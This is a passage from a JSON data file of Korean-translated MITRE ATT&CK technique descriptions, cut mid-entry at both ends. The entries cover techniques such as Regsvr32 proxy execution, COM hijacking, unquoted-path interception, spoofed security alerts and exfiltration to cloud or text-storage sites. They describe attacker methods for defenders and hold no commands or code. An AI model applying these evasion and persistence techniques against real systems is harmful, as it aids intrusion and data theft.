    "description": "적대자는 Regsvr32.exe를 악성 코드 실행을 프록시하는 데 악용할 수 있습니다. Regsvr32.exe는 Windows 시스템에서 동적 링크 라이브러리(DLL)를 포함한 객체 연결 및 삽입 컨트롤을 등록 및 등록 취소하는 데 사용되는 명령줄 프로그램입니다. Regsvr32.exe 바이너리는 Microsoft에 의해 서명될 수도 있습니다. \n\nRegsvr32.exe의 악의적인 사용은 정식 사용으로 인해 regsvr32.exe 프로세스의 실행 및 로드된 모듈을 모니터링하지 않는 보안 도구를 피할 수 있습니다. Regsvr32.exe는 COM 스크립렛을 로드하여 사용자 권한으로 DLL을 실행하는 기능을 이용해 애플리케이션 제어를 우회하는 데 사용될 수 있습니다. Regsvr32.exe는 네트워크 및 프록시 인식이 가능하므로, 외부 웹 서버의 파일에 대한 통합 자원 위치(URL)를 인수로 전달하여 스크립트를 로드할 수 있습니다. 이 방법은 COM 객체가 실제로 등록되지 않고 실행만 되므로 레지스트리에 변경을 가하지 않습니다. 이 기술의 변형은 종종 \"Squiblydoo\"라고 불리며, 정부를 목표로 하는 캠페인에서 사용되었습니다. \n\nRegsvr32.exe는 지속성을 확립하는 데 사용되는 COM 객체를 등록하는 데도 활용될 수 있습니다.",
    "external_id": "T1218.010",
    "modified": "2023-04-21T12:24:56.148Z",
    "translated": true
  },
  {
    "title": "Exfiltration to Text Storage Sites",
    "description": "적의 행위자는 주요 명령 및 제어 채널 대신 텍스트 저장소 사이트로 데이터를 유출할 수 있습니다. 텍스트 저장소 사이트는 일반적으로 개발자들이 코드 및 기타 정보를 공유하는 데 사용됩니다.\n\n텍스트 저장소 사이트는 C2 통신을 위한 악성 코드를 호스팅하는 데 자주 사용되지만, 적의 행위자들은 수집한 데이터를 유출하기 위해 이러한 사이트를 사용할 수도 있습니다. 또한, 유료 기능과 암호화 옵션은 적의 행위자들이 데이터를 더 안전하게 숨기고 저장할 수 있게 할 수 있습니다.\n\n**참고:** 이는 API를 통해 코드 리포지토리에 접근하는 것을 강조하는 코드 리포지토리로의 유출과는 구별됩니다.",
    "external_id": "T1567.003",
    "modified": "2023-05-04T18:00:33.023Z",
    "translated": true
  },
  {
    "title": "Software",
    "description": "적대자는 표적을 설정하는 데 사용할 수 있는 피해자의 호스트 소프트웨어에 대한 정보를 수집할 수 있습니다. 설치된 소프트웨어에 대한 정보에는 특정 호스트에서의 종류 및 버전, 추가 방어 보호 장치(예: 바이러스 백신, SIEM 등)의 존재를 나타낼 수 있는 추가 구성 요소에 대한 다양한 세부 정보가 포함될 수 있습니다.\n\n적대자는 이 정보를 다양한 방법으로 수집할 수 있으며, 여기에는 직접적인 수집 행동(예: 리스닝 포트, 서버 배너, 사용자 에이전트 문자열)이나 정보 낚시에 포함되어 있습니다. 또한, 적대자는 사이트를 침해하여 방문자의 호스트 정보를 수집하기 위해 설계된 악성 콘텐츠를 포함할 수 있습니다. 설치된 소프트웨어에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있습니다(예: 구인 공고, 네트워크 맵, 평가 보고서, 이력서 또는 구매 송장). 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며(예: 공개 웹사이트/도메인 검색 또는 공개 기술 데이터베이스 검색), 운영 자원을 구축하거나(예: 능력 개발 또는 능력 확보) 초기 접근을 위한 기회를 제공합니다(예: 공급망 침해 또는 외부 원격 서비스).",
    "external_id": "T1592.002",
    "modified": "2021-10-17T16:33:19.596Z",
    "translated": true
  },
  {
    "title": "Input Capture",
    "description": "적대자는 사용자 입력을 캡처하는 방법을 사용하여 자격 증명을 얻거나 정보를 수집할 수 있습니다. 일반적인 시스템 사용 중 사용자는 로그인 페이지나 시스템 대화 상자와 같은 다양한 위치에 자격 증명을 제공하는 경우가 많습니다. 입력 캡처 메커니즘은 사용자에게 투명할 수 있거나 사용자가 진정한 서비스로 믿게 하여 입력을 제공하도록 속이는 데 의존할 수 있습니다.",
    "external_id": "T1056",
    "modified": "2024-08-13T17:33:45.244Z",
    "translated": true
  },
  {
    "title": "Spearphishing Voice",
    "description": "적대자들은 음성 통신을 사용하여 피해자 시스템에 접근하려 할 수 있습니다. 음성 스피어 피싱은 스피어 피싱의 특정 변형입니다. 이는 전화 통화나 기타 음성 통신을 통해 사용자가 시스템에 대한 접근을 제공하도록 조작하는 방법을 사용하여 다른 형태의 스피어 피싱과 다릅니다. 스피어 피싱은 자주 신뢰할 수 있는 출처로 가장하는 것과 같은 사회 공학 기술을 포함하며, 수신자에게 긴박감이나 경각심을 불어넣는 경우도 있습니다.\n\n모든 형태의 피싱은 전자적으로 전달되는 사회 공학입니다. 이 시나리오에서 적대자들은 피해자에게 직접적으로 악성 코드를 보내지 않고, 사용자 실행에 의존하여 전달 및 실행합니다. 예를 들어, 피해자들은 특정 전화번호로 전화하라는 지시가 포함된 피싱 메시지를 받을 수 있으며, 그곳에서 악성 URL을 방문하거나 악성 코드를 다운로드하거나 적대자가 접근할 수 있는 원격 관리 도구를 자신의 컴퓨터에 설치하도록 안내받습니다.\n\n적대자들은 또한 음성 피싱과 다단계 인증 요청 생성을 결합하여 사용자가 MFA 자격 증명을 누설하거나 인증 프롬프트를 수락하도록 속일 수 있습니다.",
    "external_id": "T1566.004",
    "modified": "2024-10-15T16:06:47.134Z",
    "translated": true
  },
  {
    "title": "Social Media",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 피해자에 대한 정보를 찾기 위해 소셜 미디어를 검색할 수 있습니다. 소셜 미디어 사이트는 비즈니스 발표, 직원의 역할, 위치 및 관심사와 같은 피해자 조직에 대한 다양한 정보를 포함하고 있을 수 있습니다.\n\n적대자는 수집하려는 정보에 따라 다양한 소셜 미디어 사이트를 검색할 수 있습니다. 위협 행위자는 이러한 사이트에서 수동적으로 데이터를 수집할 수 있으며, 수집한 정보를 사용하여 피해자가 특정 정보를 드러내도록 유도하는 가짜 프로필이나 그룹을 만들 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰을 위한 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 확보하는 데 활용될 수 있습니다.",
    "external_id": "T1593.001",
    "modified": "2021-04-15T03:52:40.958Z",
    "translated": true
  },
  {
    "title": "Component Object Model Hijacking",
    "description": "적대자는 해킹된 COM(구성 요소 개체 모델) 객체에 대한 참조를 유발하여 악성 콘텐츠를 실행함으로써 지속성을 설정할 수 있습니다. COM은 운영 체제를 통해 소프트웨어 구성 요소 간의 상호 작용을 가능하게 하는 Windows 내의 시스템입니다. 다양한 COM 객체에 대한 참조는 레지스트리에 저장됩니다.\n\n적대자는 COM 시스템을 사용하여 COM 참조 및 관계를 탈취함으로써 합법적인 소프트웨어 대신 실행될 수 있는 악성 코드를 삽입하여 지속성을 유지할 수 있습니다. COM 객체를 탈취하려면 합법적인 시스템 구성 요소에 대한 참조를 교체하기 위해 레지스트리에서 변경이 필요하며, 이는 해당 구성 요소가 실행될 때 작동하지 않도록 할 수 있습니다. 정상적인 시스템 작동을 통해 해당 시스템 구성 요소가 실행될 때 적대자의 코드가 대신 실행됩니다. 적대자는 지속성을 유지하기 위해 일관된 수준으로 자주 사용되는 객체를 탈취할 가능성이 높지만, 시스템의 눈에 띄는 기능을 저해하지 않도록 하여 탐지로 이어질 수 있는 시스템 불안정을 피하려고 합니다.",
    "external_id": "T1546.015",
    "modified": "2023-04-21T12:34:29.402Z",
    "translated": true
  },
  {
    "title": "Credentials",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 자격 증명을 수집할 수 있습니다. 적대자가 수집하는 계정 자격 증명은 대상 피해 조직과 직접 연결된 것일 수 있으며, 사용자가 개인 계정과 비즈니스 계정 간에 동일한 비밀번호를 사용하는 경향을 이용하려고 시도할 수 있습니다.\n\n적대자는 다양한 방법으로 잠재적인 피해자로부터 자격 증명을 수집할 수 있으며, 정보 유출을 통한 직접적인 유도와 같은 방식이 있습니다. 또한, 적대자는 웹사이트를 침해한 후 방문자로부터 웹사이트 인증 쿠키를 수집하기 위해 악성 콘텐츠를 추가할 수 있습니다. 다중 요소 인증(MFA)이 사용되는 경우, 적대자는 서비스 제공자를 침해하여 MFA 코드 및 일회성 비밀번호(OTP)에 접근할 수 있습니다.\n\n자격 증명 정보는 온라인 또는 기타 접근 가능한 데이터 세트에 유출되어 적대자에게 노출될 수도 있습니다. 적대자는 다크 웹 시장에서 자격 증명을 구매할 수도 있으며, Telegram 채널을 통해 인포스틸러 악성코드의 로그를 배포하는 접근을 통해서도 구매할 수 있습니다.\n\n이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 수립하는 데 도움이 될 수 있습니다.",
    "external_id": "T1589.001",
    "modified": "2024-10-10T13:45:01.069Z",
    "translated": true
  },
  {
    "title": "Compromise Software Supply Chain",
    "description": "적대자가 최종 소비자에게 전달되기 전에 애플리케이션 소프트웨어를 조작하여 데이터나 시스템을 침해할 수 있습니다. 소프트웨어의 공급망 침해는 애플리케이션 소스 코드의 조작, 해당 소프트웨어의 업데이트/배포 메커니즘 조작, 또는 컴파일된 릴리스를 수정된 버전으로 교체하는 등 여러 가지 방법으로 발생할 수 있습니다.\n\n타겟팅은 특정 희생자를 목표로 할 수도 있고, 넓은 소비자 집단에 분산될 수도 있지만 특정 희생자에게만 추가 전술을 적용할 수 있습니다.",
    "external_id": "T1195.002",
    "modified": "2022-04-28T16:04:36.636Z",
    "translated": true
  },
  {
    "title": "Rename System Utilities",
    "description": "적대자는 합법적인 시스템 유틸리티의 이름을 바꿔서 이러한 유틸리티의 사용과 관련된 보안 메커니즘을 회피하려 할 수 있습니다. 적대자가 악용할 수 있는 시스템 유틸리티에 대한 보안 모니터링 및 제어 메커니즘이 마련되어 있을 수 있습니다. 이러한 보안 메커니즘을 우회하는 것은 유틸리티를 사용하기 전에 이름을 바꾸는 것으로 가능할 수 있습니다. 또 다른 경우는 합법적인 유틸리티가 복사되거나 다른 디렉토리로 이동된 후 이름이 변경되어 비표준 경로에서 실행되는 시스템 유틸리티를 기반으로 한 감지를 피하는 경우입니다.",
    "external_id": "T1036.003",
    "modified": "2024-09-12T19:30:45.065Z",
    "translated": true
  },
  {
    "title": "Bidirectional Communication",
    "description": "적대자는 기존의 합법적인 외부 웹 서비스를 이용해 손상된 시스템에 명령을 보내고 출력 결과를 받을 수 있습니다. 손상된 시스템은 인지도가 높은 웹사이트와 소셜 미디어를 통해 명령 및 제어(C2) 지침을 호스팅할 수 있습니다. 감염된 시스템은 이러한 명령의 출력을 해당 웹 서비스 채널을 통해 다시 전송할 수 있습니다. 반환 트래픽은 사용되는 웹 서비스에 따라 다양한 방식으로 발생할 수 있습니다. 예를 들어, 반환 트래픽은 손상된 시스템이 포럼에 댓글을 게시하거나 개발 프로젝트에 풀 요청을 제출하거나 웹 서비스에서 호스팅되는 문서를 업데이트하거나 트윗을 보내는 형식을 취할 수 있습니다.\n\nC2의 메커니즘으로 작용하는 인기 있는 웹사이트와 소셜 미디어는 네트워크 내 호스트들이 이미 손상 이전에 이들과 통신하고 있을 가능성 때문에 상당한 양의 은폐를 제공할 수 있습니다. 구글이나 트위터와 같은 일반적인 서비스를 사용하면 적대자들이 예상되는 노이즈 속에 숨기 쉬워집니다. 웹 서비스 제공자는 일반적으로 SSL/TLS 암호화를 사용하므로 적대자에게 추가적인 보호 수준을 제공합니다.",
    "external_id": "T1102.002",
    "modified": "2020-03-26T23:15:47.861Z",
    "translated": true
  },
  {
    "title": "Exploitation for Client Execution",
    "description": "대적자는 클라이언트 애플리케이션의 소프트웨어 취약점을 악용하여 코드를 실행할 수 있습니다. 소프트웨어에는 안전하지 않은 코딩 관행으로 인해 예기치 않은 동작을 초래할 수 있는 취약점이 존재할 수 있습니다. 대적자는 임의 코드 실행을 목적으로 특정 취약점을 표적화하여 악용할 수 있습니다. 공격 도구 키트에서 가장 가치 있는 악용 방법은 원격 시스템에서 코드 실행을 얻을 수 있는 경우이며, 이는 해당 시스템에 대한 접근을 얻는 데 사용될 수 있습니다. 사용자는 일반적으로 업무에 사용하던 애플리케이션과 관련된 파일을 기대하기 때문에, 이는 높은 유용성으로 인해 악용 연구 및 개발에 유용한 목표가 됩니다.\n\n몇 가지 유형이 있습니다:\n\n### 브라우저 기반 악용\n\n웹 브라우저는 일반적으로 표적이 되며, 이는 전형적인 공격 방식 중 하나입니다. 엔드포인트 시스템은 일반적인 웹 브라우징이나 특정 사용자가 스피어피싱 이메일의 링크를 통해 대적자가 통제하는 사이트에 표적될 때 손상될 수 있습니다. 이러한 공격은 종종 사용자가 아무런 행동을 하지 않아도 악용이 실행될 수 있습니다.\n\n### 오피스 애플리케이션\n\nMicrosoft Office와 같은 일반적인 오피스 및 생산성 애플리케이션도 표적이 됩니다. 악성 파일은 첨부 파일로 직접 전송되거나 다운로드 링크를 통해 전달됩니다. 이러한 경우 사용자가 문서나 파일을 열어야 악용이 실행됩니다.\n\n### 일반적인 제3자 애플리케이션\n\n표적 네트워크에 배포된 소프트웨어의 일부로 흔히 사용되는 다른 애플리케이션도 악용될 수 있습니다. 기업 환경에서 일반적으로 사용되는 Adobe Reader와 Flash와 같은 애플리케이션은 시스템에 접근하기 위해 대적자들이 주기적으로 표적을 삼고 있습니다. 소프트웨어와 취약점의 성격에 따라 일부는 브라우저에서 악용되거나 사용자가 파일을 열어야 할 수 있습니다. 예를 들어, 일부 Flash 악용은 Microsoft Office 문서 내 객체로 전달되기도 했습니다.",
    "external_id": "T1203",
    "modified": "2024-10-15T16:34:23.908Z",
    "translated": true
  },
  {
    "title": "Wordlist Scanning",
    "description": "적대자는 반복적으로 인프라를 탐색하기 위해 무차별 대입 공격 및 크롤링 기술을 사용할 수 있습니다. 이 기술은 유효한 자격 증명의 발견보다는 콘텐츠와 인프라의 식별을 목표로 합니다. 이러한 스캔에 사용되는 단어 목록은 일반적이고 일반적으로 사용되는 이름 및 파일 확장자 또는 특정 소프트웨어에 특화된 용어를 포함할 수 있습니다. 적대자는 또한 다른 정찰 기술을 통해 수집한 데이터를 사용하여 맞춤형, 타겟 특화 단어 목록을 생성할 수 있습니다.\n\n예를 들어, 적대자는 Dirb, DirBuster 및 GoBuster와 같은 웹 콘텐츠 발견 도구와 일반적 또는 맞춤형 단어 목록을 사용하여 웹사이트의 페이지와 디렉터리를 나열할 수 있습니다. 이는 그들이 오래된 취약한 페이지나 숨겨진 관리 포털을 발견하여 추후 공격의 목표로 삼는 데 도움이 될 수 있습니다.\n\n클라우드 스토리지 솔루션은 일반적으로 전 세계에서 고유한 이름을 사용하므로, 적대자는 타겟 특화 단어 목록과 s3recon 및 GCPBucketBrute와 같은 도구를 사용하여 클라우드 인프라의 공개 및 비공개 버킷을 나열할 수 있습니다. 저장 개체가 발견되면, 적대자는 클라우드 스토리지에서 데이터를 활용하여 외부로 반출하거나 권한을 상승시키고 측면으로 이동하는 데 사용할 수 있는 귀중한 정보에 접근할 수 있습니다.",
    "external_id": "T1595.003",
    "modified": "2022-04-15T19:10:23.838Z",
    "translated": true
  },
  {
    "title": "Spoof Security Alerting",
    "description": "적대자는 도구의 보안 경고를 가장하여 방어자가 악의적인 활동에 대한 경각심을 떨어뜨릴 수 있는 잘못된 증거를 제시할 수 있다. 방어 도구가 생성하는 메시지는 잠재적인 보안 사건에 대한 정보와 보안 소프트웨어 및 시스템의 작동 상태를 포함하고 있다. 보안 보고 메시지는 시스템의 정상 작동을 모니터링하고 보안 사건을 신호할 수 있는 중요한 사건을 식별하는 데 중요하다.\n\n적대자는 [지표 차단] 대신 또는 여기에 추가하여 정당한 보안 도구가 비활성화된 후에도 보안 도구가 계속 작동하고 있다는 긍정적인 확인을 가장할 수 있다. 적대자는 또한 감염 후에도 “건강한” 시스템 상태를 제시할 수 있다. 이는 방어자의 반응을 지연시켜 추가적인 악의적인 활동을 가능하게 하는 데 악용될 수 있다.\n\n예를 들어, 적대자는 Windows Defender 및 기타 시스템 도구가 비활성화된 후 \"건강한\" 시스템 상태를 가진 가짜 Windows 보안 GUI와 트레이 아이콘을 표시할 수 있다.",
    "external_id": "T1562.011",
    "modified": "2024-10-16T20:12:44.962Z",
    "translated": true
  },
  {
    "title": "Outlook Home Page",
    "description": "적대자는 Microsoft Outlook의 홈 페이지 기능을 악용하여 침해된 시스템에서 지속성을 확보할 수 있습니다. Outlook 홈 페이지는 Outlook 폴더의 표현을 사용자 정의하는 데 사용되는 오래된 기능입니다. 이 기능은 폴더가 열릴 때마다 내부 또는 외부 URL이 로드되고 표시되도록 합니다. 악성 HTML 페이지가 제작되어 Outlook 홈 페이지에 의해 로드될 때 코드를 실행할 수 있습니다.\n\n악성 홈 페이지가 사용자의 사서함에 추가되면, Outlook이 시작될 때 로드됩니다. 악성 홈 페이지는 적절한 Outlook 폴더가 로드되거나 다시 로드될 때 실행됩니다.",
    "external_id": "T1137.004",
    "modified": "2024-10-15T16:02:13.742Z",
    "translated": true
  },
  {
    "title": "Asymmetric Cryptography",
    "description": "적대 세력은 통신 프로토콜이 제공하는 고유한 보호에 의존하기보다는 명백한 비대칭 암호화 알고리즘을 사용하여 명령 및 제어 트래픽을 숨길 수 있다. 비대칭 암호화는 공개 키 암호화로도 알려져 있으며, 각 당사자에 대해 한 쌍의 키를 사용한다: 자유롭게 배포할 수 있는 공개 키와 개인 키 하나이다. 키가 생성되는 방식 때문에, 발신자는 수신자의 공개 키를 사용하여 데이터를 암호화하고, 수신자는 자신의 개인 키를 사용하여 데이터를 복호화한다. 이는 오직 의도된 수신자만이 암호화된 데이터를 읽을 수 있도록 보장한다. 일반적인 공개 키 암호화 알고리즘으로는 RSA와 ElGamal이 있다.\n\n효율성을 위해 많은 프로토콜(SSL/TLS 포함)은 연결이 설정된 후 대칭 암호화를 사용하지만, 키를 설정하거나 전송하기 위해 비대칭 암호화를 사용한다. 따라서 이러한 프로토콜은 비대칭 암호화로 분류된다.",
    "external_id": "T1573.002",
    "modified": "2023-12-26T20:59:21.941Z",
    "translated": true
  },
  {
    "title": "Exfiltration to Cloud Storage",
    "description": "적대 세력은 주요 지휘 및 통제 채널을 통해서가 아니라 클라우드 저장 서비스로 데이터를 유출할 수 있다. 클라우드 저장 서비스는 인터넷을 통해 원격 클라우드 저장 서버에서 데이터를 저장하고, 편집하며, 검색할 수 있도록 한다. 이러한 클라우드 저장 서비스로의 유출은 네트워크 내 호스트가 이미 해당 서비스와 통신하고 있는 경우 적대 세력에게 상당한 은폐 수단을 제공할 수 있다.",
    "external_id": "T1567.002",
    "modified": "2023-09-15T19:11:47.547Z",
    "translated": true
  },
  {
    "title": "Lateral Tool Transfer",
    "description": "적대자는 손상된 환경 내에서 시스템 간에 도구나 다른 파일을 전송할 수 있습니다. 피해 환경으로 가져온 후, 파일은 하나의 시스템에서 다른 시스템으로 복사되어 적대자의 도구나 기타 파일을 작전 진행 중에 준비할 수 있습니다.\n\n적대자는 내부 피해 시스템 간에 파일을 복사하여 SMB/Windows 관리 공유와 같은 고유 파일 공유 프로토콜을 사용하여 연결된 네트워크 공유로 또는 원격 데스크톱 프로토콜을 통해 인증된 연결로 측면 이동을 지원할 수 있습니다.\n\n파일은 또한 피해 시스템에 존재하는 기본 도구들을 사용하여 전송할 수 있습니다. 예를 들어 scp, rsync, curl, sftp 등이 있습니다. 경우에 따라, 적대자는 Dropbox나 OneDrive와 같은 웹 서비스를 이용해 공유된 자동 동기화 폴더를 통해 한 기계에서 다른 기계로 파일을 복사할 수 있습니다.",
    "external_id": "T1570",
    "modified": "2023-10-01T13:48:28.738Z",
    "translated": true
  },
  {
    "title": "Path Interception by Unquoted Path",
    "description": "적대자는 취약한 파일 경로 참조를 탈취하여 자신들의 악성 페이로드를 실행할 수 있습니다. 적대자는 경로에 주위에 따옴표가 없는 경우를 이용하여, 경로 내 상위 디렉터리에 실행 파일을 배치함으로써 Windows가 적대자의 실행 파일을 선택하도록 할 수 있습니다.\n\n서비스 경로와 바로 가기 경로는 하나 이상의 공백이 포함되어 있으며 따옴표로 둘러싸여 있지 않은 경우에도 경로 탈취에 취약할 수 있습니다. 적대자는 경로의 상위 디렉터리에 실행 파일을 배치할 수 있으며, 이 경우 Windows는 의도된 실행 파일 대신 해당 실행 파일을 해석하게 됩니다. 예를 들어, 바로 가기 경로가 특정된 경우, 적대자는 의도된 프로그램 대신 실행될 프로그램을 통해 실행 파일을 만들 수 있습니다. \n\n이 기술은 정기적으로 호출되는 실행 파일을 통해 지속성을 위해 사용될 수 있으며, 탈취된 실행 파일이 더 높은 권한의 프로세스에 의해 시작될 경우 권한 상승에도 이용될 수 있습니다.",
    "external_id": "T1574.009",
    "modified": "2023-03-30T21:01:35.788Z",
    "translated": true
  },
  {
    "title": "Install Digital Certificate",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 SSL/TLS 인증서를 설치할 수 있습니다. SSL/TLS 인증서는 서버에 설치되어 시스템 간 안전한 통신을 가능하게 하는 파일입니다. 디지털 인증서에는 키에 대한 정보, 소유자의 신원 정보, 인증서 내용을 올바르다고 확인한 주체의 디지털 서명이 포함되어 있습니다. 서명이 유효하고 인증서를 검토하는 사람이 서명자를 신뢰한다면, 그들은 해당 키를 사용하여 소유자와 안전하게 통신할 수 있음을 알게 됩니다. 인증서는 서버에 업로드될 수 있으며, 이후 서버는 인증서를 사용하여 암호화된 통신을 활성화하도록 구성될 수 있습니다.\n\n적대자는 C2 트래픽을 암호화하거나 자격 증명 수확 사이트에 신뢰성을 부여하는 등의 작업을 위해 SSL/TLS 인증서를 설치할 수 있습니다. 디지털 인증서의 설치는 웹 서버 및 이메일 서버를 포함한 여러 서버 유형에서 이루어질 수 있습니다.\n\n적대자는 디지털 인증서를 얻거나 자기 서명 인증서를 생성할 수 있습니다. 그런 다음 디지털 인증서는 적대자가 제어하는 인프라에 설치될 수 있으며, 이는 획득된 인프라일 수도 있고 이전에 타협된 인프라일 수도 있습니다.",
    "external_id": "T1608.003",
    "modified": "2021-10-16T17:47:46.409Z",
    "translated": true
  },
  {
    "title": "Startup Items",
    "description": "적대자는 부팅 초기화 시 자동으로 실행되는 시작 항목을 사용하여 지속성을 확보할 수 있습니다. 시작 항목은 부팅 과정의 마지막 단계에서 실행되며, 시스템이 모든 시작 항목의 실행 순서를 결정하는 데 사용하는 셸 스크립트나 기타 실행 파일과 구성 정보가 포함되어 있습니다.\n\n이 기술은 기술적으로 더 이상 사용되지 않으며, 따라서 적절한 폴더인 /Library/StartupItems가 시스템에 기본적으로 존재할 것이라고 보장되지 않지만, macOS Sierra에서는 기본적으로 존재하는 것으로 보입니다. 시작 항목은 실행 파일과 구성 속성 목록(plist)인 StartupParameters.plist가 최상위 디렉토리에 위치하는 디렉토리입니다.\n\n적대자는 StartupItems 디렉토리에 적절한 폴더/파일을 생성하여 자신의 지속성 메커니즘을 등록할 수 있습니다. 또한, StartupItems는 macOS의 부팅 단계에서 실행되므로 상승된 루트 사용자로 실행됩니다.",
    "external_id": "T1037.005",
    "modified": "2022-04-20T16:43:21.560Z",
    "translated": true
  },
  {
    "title": "System Language Discovery",
    "description": "적대자는 피해자의 시스템 언어에 대한 정보를 수집하여 해당 호스트의 지리적 위치를 추론하려고 할 수 있습니다. 이 정보는 적대자가 목표를 감염시키거나 특정 작업을 시도할지 여부와 같은 후속 행동을 형성하는 데 사용될 수 있습니다. 이 결정은 멀웨어 개발자와 운영자가 특정 법 집행 기관의 주목이나 다른 기관의 기소/조사로부터의 위험을 줄이기 위해 활용될 수 있습니다.\n\n적대자가 시스템 언어를 추론하는 데 사용할 수 있는 다양한 데이터 소스가 있으며, 시스템 기본값 및 키보드 레이아웃이 포함됩니다. 특정 검사는 대상 및/또는 적대자에 따라 다를 수 있지만, 레지스트리 조회 및 네이티브 API 함수 호출과 같은 행동이 포함될 수 있습니다.\n\n예를 들어, Windows 시스템에서 적대자는 레지스트리 키를 조회하거나 Windows API 함수의 출력을 분석하여 시스템 언어를 추론하려고 할 수 있습니다. \n\nmacOS 또는 Linux 시스템에서는 적대자가 'locale'을 조회하여 '$LANG' 환경 변수의 값을 검색할 수 있습니다.",
    "external_id": "T1614.001",
    "modified": "2021-10-15T22:00:56.174Z",
    "translated": true
  },
  {
    "title": "Non-Application Layer Protocol",
    "description": "적대자들은 호스트와 C2 서버 간 또는 네트워크 내 감염된 호스트 간의 통신을 위해 OSI 비애플리케이션 계층 프로토콜을 사용할 수 있다. 가능한 프로토콜의 목록은 방대하다. 특정 예로는 인터넷 제어 메시지 프로토콜(ICMP)과 같은 네트워크 계층 프로토콜, 사용자 데이터그램 프로토콜(UDP)과 같은 전송계층 프로토콜, 소켓 보안(SOCKS)과 같은 세션 계층 프로토콜, 직렬 LAN(SOL)과 같은 리다이렉트/터널링 프로토콜이 있다.\n\n호스트 간의 ICMP 통신이 한 가지 예이다. ICMP는 인터넷 프로토콜 스위트의 일부이기 때문에 모든 IP 호환 호스트에서 구현해야 한다. 그러나 ICMP는 TCP나 UDP와 같은 다른 인터넷 프로토콜만큼 일반적으로 모니터링되지 않으며, 적대자들이 통신을 숨기는 데 사용할 수 있다.",
    "external_id": "T1095",
    "modified": "2023-09-29T21:07:31.570Z",
    "translated": true
  },
  {
    "title": "Steganography",
    "description": "적대자는 숨겨진 정보의 탐지를 방지하기 위해 스테가노그래피 기술을 사용할 수 있습니다. 스테가노그래피 기술은 이미지, 오디오 트랙, 비디오 클립 또는 텍스트 파일과 같은 디지털 매체에 데이터를 숨기는 데 사용될 수 있습니다.\n\nDuqu는 스테가노그래피를 사용한 초기 악성 코드의 예입니다. 이는 피해자의 시스템에서 수집한 정보를 암호화하고 이미지를 C2 서버로 전송하기 전에 이미지 안에 숨겼습니다.\n\n2017년 말, 한 위협 그룹은 <code>Invoke-PSImage</code>를 사용하여 이미지 파일(.png) 안에 PowerShell 명령을 숨기고 피해자의 시스템에서 코드를 실행했습니다. 이 경우 PowerShell 코드는 피해자의 머신에서 정보를 수집하고 이를 적대자에게 전달하기 위해 또 다른 난독화된 스크립트를 다운로드했습니다.",
    "external_id": "T1027.003",
    "modified": "2023-03-30T21:01:48.815Z",
    "translated": true
  },
  {
    "title": "DNS Server",
    "description": "적대 세력은 목표 설정 중에 사용할 수 있는 타사 DNS 서버를 손상시킬 수 있습니다. 손상 이후 활동 중에 적대 세력은 다양한 작업을 위해 DNS 트래픽을 활용할 수 있으며, 여기에는 명령 및 제어가 포함됩니다. 그들은 자신의 DNS 서버를 설정하는 대신 작전 지원을 위해 타사 DNS 서버를 손상시킬 수 있습니다.\n\nDNS 서버를 손상시킴으로써 적대 세력은 DNS 기록을 변경할 수 있습니다. 이러한 제어는 조직의 트래픽을 리디렉션할 수 있게 하여 적대 세력이 정보 수집 및 자격 증명 접근을 용이하게 할 수 있습니다. 또한, 적대 세력은 이러한 제어를 디지털 인증서와 결합하여 적대 세력이 제어하는 인프라로 트래픽을 리디렉션하고 정상적인 신뢰할 수 있는 네트워크 통신을 모방할 수 있습니다. 적대 세력은 또한 실제 DNS 서버 소유자에게 경고를 주지 않고 악의적인 서버를 가리키는 하위 도메인을 조용히 생성할 수 있을지도 모릅니다.",
    "external_id": "T1584.002",
    "modified": "2022-04-19T21:22:13.578Z",
    "translated": true
  },
  {
    "title": "Protocol or Service Impersonation",
    "description": "적대자가 합법적인 프로토콜이나 웹 서비스 트래픽을 가장하여 명령 및 제어 활동을 은폐하고 분석 노력을 방해할 수 있습니다. 합법적인 프로토콜이나 웹 서비스를 가장함으로써 적대자는 자신의 명령 및 제어 트래픽이 합법적인 네트워크 트래픽과 혼합되도록 만들 수 있습니다.\n\n적대자는 또한 가짜 SSL/TLS 핸드셰이크를 가장하여 후속 트래픽이 SSL/TLS로 암호화된 것처럼 보이게 하여 일부 보안 도구에 방해가 될 수 있거나 트래픽이 신뢰할 수 있는 엔터티와 관련이 있는 것처럼 보이게 할 수 있습니다.\n\n적대자는 합법적인 프로토콜을 활용하여 예상되는 웹 트래픽이나 신뢰할 수 있는 서비스를 가장할 수도 있습니다. 예를 들어, 적대자는 HTTP 헤더, URI 엔드포인트, SSL 인증서 및 전송된 데이터를 조작하여 C2 통신을 은폐하거나 Gmail, Google Drive 및 Yahoo Messenger와 같은 합법적인 서비스를 모방할 수 있습니다.",
    "external_id": "T1001.003",
    "modified": "2024-10-09T15:40:19.436Z",
    "translated": true
  },
  {
    "title": "Query Registry",
    "description": "적대 세력은 시스템, 구성 및 설치된 소프트웨어에 대한 정보를 수집하기 위해 Windows 레지스트리와 상호작용할 수 있습니다.\n\n레지스트리는 운영 체제, 구성, 소프트웨어 및 보안에 대한 많은 정보를 포함하고 있습니다. 정보를 쉽게 쿼리할 수 있는 유틸리티가 존재하지만, 레지스트리에 접근할 수 있는 다른 방법도 있습니다. 이러한 정보는 적대 세력이 네트워크 내에서 작전을 진행하는 데 도움이 될 수 있습니다. 적대 세력은 자동화된 탐색 중에 레지스트리 정보를 사용하여 후속 행동을 형성할 수 있습니다. 여기에는 적대 세력이 목표를 완전히 감염시키는지 여부나 특정 작업을 시도하는지 여부가 포함됩니다.",
    "external_id": "T1012",
    "modified": "2023-04-03T18:56:37.011Z",
    "translated": true
  },
  {
    "title": "Data Transfer Size Limits",
    "description": "적대자는 전체 파일 대신 고정 크기 조각으로 데이터를 유출하거나 패킷 크기를 특정 임계값 이하로 제한할 수 있습니다. 이러한 접근 방식은 네트워크 데이터 전송 임계값 경고를 유발하지 않기 위해 사용될 수 있습니다.",
    "external_id": "T1030",
    "modified": "2020-07-14T19:47:46.912Z",
    "translated": true
  },
  {
    "title": "Web Session Cookie",
